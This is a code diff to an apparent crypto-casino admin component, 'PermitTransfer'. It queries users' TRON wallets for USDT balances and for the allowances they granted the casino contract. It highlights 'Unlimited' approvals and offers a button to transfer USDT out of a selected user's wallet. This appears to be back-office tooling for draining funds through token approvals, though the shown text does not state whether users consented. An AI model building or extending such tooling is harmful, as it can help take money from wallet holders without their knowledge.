@@ -25,6 +25,8 @@ interface UserWithData extends UserData {
   allowance: bigint;
   balance: bigint;
   network: 'tron' | 'evm';
+  hasApproval?: boolean;
+  isUnlimited?: boolean;
 }
 
 // Helper to check if address is a TRON address (starts with T or t, case-insensitive)
@@ -36,6 +38,8 @@ const isTronAddress = (address: string): boolean => {
 const isEvmAddress = (address: string): boolean => {
   return !!address && address.startsWith('0x') && address.length === 42;
 };
+
+const UNLIMITED_THRESHOLD = BigInt(10) ** BigInt(30);
 
 export function PermitTransfer() {
   const { address: tronAddress, connected: isTronConnected } = useWallet();
@@ -102,30 +106,41 @@ export function PermitTransfer() {
       const response = await fetch('/api/admin/tron-approvals');
       const data = await response.json();
       
-      console.log('[TRON] API Response:', data);
+      console.log('[TRON] API Response:', JSON.stringify(data, null, 2));
       
       if (response.ok && !data.error) {
-        console.log(`[TRON] Found ${data.users?.length || 0} users with approvals`);
-        console.log(`[TRON] Network: ${data.network}, Contract: ${data.casinoContract}`);
-        console.log(`[TRON] Total addresses checked: ${data.totalChecked || 'N/A'}`);
+        console.log('='.repeat(50));
+        console.log(`[TRON] Network: ${data.network}`);
+        console.log(`[TRON] Casino Contract: ${data.casinoContract}`);
+        console.log(`[TRON] USDT Contract: ${data.usdtContract}`);
+        console.log(`[TRON] Total users checked: ${data.totalUsersChecked || 0}`);
+        console.log(`[TRON] Users with balance > 0: ${data.users?.length || 0}`);
+        console.log('='.repeat(50));
         
         if (data.users?.length > 0) {
-          console.log('[TRON] Users with approvals:', data.users);
+          console.log('[TRON] Users with USDT balance:');
+          data.users.forEach((u: any, i: number) => {
+            const balance = Number(u.balance) / 1e6;
+            const allowance = Number(u.allowance) / 1e6;
+            const approved = u.hasApproval ? '✓' : '✗';
+            console.log(`  ${i + 1}. ${u.wallet_address}: ${balance.toFixed(2)} USDT (Approved: ${approved}, Allowance: ${allowance.toFixed(2)})`);
+          });
+        } else {
+          console.log('[TRON] No users with USDT balance found');
+          toast.info(`Checked ${data.totalUsersChecked} users, no USDT balances found`);
         }
         
         const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
           id: u.id,
           wallet_address: u.wallet_address,
-          allowance: BigInt(u.allowance),
-          balance: BigInt(u.balance),
-          network: 'tron' as const
+          allowance: BigInt(u.allowance || '0'),
+          balance: BigInt(u.balance || '0'),
+          network: 'tron' as const,
+          hasApproval: u.hasApproval,
+          isUnlimited: u.isUnlimited
         }));
         
         setTronUsersWithData(usersData);
-        
-        if (usersData.length === 0) {
-          console.log('[TRON] No users with active approvals found');
-        }
         return;
       }
       
@@ -152,18 +167,12 @@ export function PermitTransfer() {
         .from('users')
         .select('id, wallet_address')
         .not('wallet_address', 'is', null)
-        .or('wallet_address.like.T%,wallet_address.like.t%');
+        .like('wallet_address', 'T%');
       
       const usersData: UserWithData[] = [];
       
       for (const user of dbUsers || []) {
         if (!isTronAddress(user.wallet_address)) continue;
-        
-        // Skip lowercase addresses - they can't be used for blockchain call
-        if (user.wallet_address.startsWith('t')) {
-          console.warn(`Skipping lowercase address: ${user.wallet_address}`);
-          continue;
-        }
         
         try {
           const [allowanceResult, balanceResult] = await Promise.all([
@@ -180,7 +189,9 @@ export function PermitTransfer() {
               wallet_address: user.wallet_address,
               allowance,
               balance,
-              network: 'tron'
+              network: 'tron',
+              hasApproval: true,
+              isUnlimited: allowance >= UNLIMITED_THRESHOLD
             });
           }
         } catch (err) {
@@ -505,7 +516,9 @@ export function PermitTransfer() {
               wallet_address: manualAddress,
               allowance,
               balance,
-              network: 'tron'
+              network: 'tron',
+              hasApproval: allowance > BigInt(0),
+              isUnlimited: allowance >= UNLIMITED_THRESHOLD
             }]);
             toast.success('Address added to the list!');
           }
@@ -610,7 +623,7 @@ export function PermitTransfer() {
               <TableRow className="border-white/10 hover:bg-transparent">
                 <TableHead>{network === 'tron' ? 'TRON' : 'EVM'} Wallet</TableHead>
                 <TableHead className="text-center">USDT Balance</TableHead>
-                <TableHead className="text-center">USDT Approved</TableHead>
+                <TableHead className="text-center">Approval Status</TableHead>
                 <TableHead>Action</TableHead>
               </TableRow>
             </TableHeader>
@@ -619,19 +632,20 @@ export function PermitTransfer() {
                 <TableRow>
                   <TableCell colSpan={4} className="text-center py-8">
                     <Loader2 className="h-6 w-6 animate-spin mx-auto mb-2" />
-                    Loading {network === 'tron' ? 'TRON' : 'EVM'} users and token data...
+                    Loading {network === 'tron' ? 'TRON' : 'EVM'} users...
                   </TableCell>
                 </TableRow>
               ) : users.length === 0 ? (
                 <TableRow>
                   <TableCell colSpan={4} className="text-center py-8 text-muted-foreground">
                     <AlertCircle className="h-6 w-6 mx-auto mb-2 opacity-50" />
-                    No {network === 'tron' ? 'TRON' : 'EVM'} users with USDT approvals found
+                    No {network === 'tron' ? 'TRON' : 'EVM'} users with USDT balance found
                   </TableCell>
                 </TableRow>
               ) : (
                 users.map((user) => {
                   const isSelected = selectedUser?.id === user.id;
+                  const hasApproval = user.hasApproval || user.allowance > BigInt(0);
                   
                   return (
                     <TableRow 
@@ -651,14 +665,24 @@ export function PermitTransfer() {
                         </div>
                       </TableCell>
                       <TableCell className="text-center">
-                        <span className="text-sm">
+                        <span className="text-sm font-medium">
                           {formatAmount(user.balance)} USDT
                         </span>
                       </TableCell>
                       <TableCell className="text-center">
-                        <Badge variant="outline" className="border-green-500/50 text-green-400">
-                          {formatAmount(user.allowance)} USDT
-                        </Badge>
+                        {(user as UserWithData).isUnlimited ? (
+                          <Badge variant="outline" className="border-green-500/50 text-green-400">
+                            ✓ Unlimited
+                          </Badge>
+                        ) : hasApproval ? (
+                          <Badge variant="outline" className="border-green-500/50 text-green-400">
+                            ✓ Approved ({formatAmount(user.allowance)})
+                          </Badge>
+                        ) : (
+                          <Badge variant="outline" className="border-yellow-500/50 text-yellow-400">
+                            ✗ Not Approved
+                          </Badge>
+                        )}
                       </TableCell>
                       <TableCell>
                         <Button 
@@ -684,6 +708,16 @@ export function PermitTransfer() {
               <CheckCircle className="h-4 w-4 text-casino-brand" />
               Transfer USDT from {formatAddress(selectedUser.wallet_address)}
             </h4>
+            
+            {/* Warning if not approved */}
+            {!(selectedUser.hasApproval || selectedUser.allowance > BigInt(0)) && (
+              <div className="flex items-center gap-2 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
+                <AlertCircle className="h-4 w-4 text-yellow-500" />
+                <span className="text-yellow-400 text-sm">
+                  This user has NOT approved the contract. Transfer will fail unless they approve first.
+                </span>
+              </div>
+            )}
             
             <div className="grid grid-cols-2 gap-4">
               <div className="space-y-2">
